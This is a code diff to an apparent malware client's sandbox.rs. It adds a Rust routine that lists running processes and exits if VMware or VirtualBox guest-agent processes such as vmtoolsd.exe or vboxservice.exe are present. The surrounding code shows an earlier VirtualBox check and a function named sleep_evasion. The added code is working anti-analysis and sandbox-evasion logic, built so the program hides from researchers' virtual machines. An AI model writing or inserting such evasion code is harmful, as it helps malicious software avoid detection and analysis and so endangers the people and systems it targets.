@@ -1,0 +1,27 @@
+diff --git a/client/src/sandbox.rs b/client/src/sandbox.rs
+index 15ee79f..0ac427c 100644
+--- a/client/src/sandbox.rs
++++ b/client/src/sandbox.rs
+@@ -117,6 +117,22 @@ pub fn check_vm_artifacts() {
+         println!("Virtualization detected (VBox)! Exiting program.");
+         exit(1);
+     }
++
++    // 3. Check for guest agent processes
++    let mut system = System::new_all();
++    system.refresh_processes();
++    for process in system.processes().values() {
++        let name = process.name().to_lowercase();
++        if name == "vmtoolsd.exe"
++            || name == "vmwaretray.exe"
++            || name == "vmwareuser.exe"
++            || name == "vboxservice.exe"
++            || name == "vboxtray.exe"
++        {
++            println!("Virtualization detected (Process)! Exiting program.");
++            exit(1);
++        }
++    }
+ }
+ 
+ pub fn sleep_evasion(sleep_duration: Duration) {
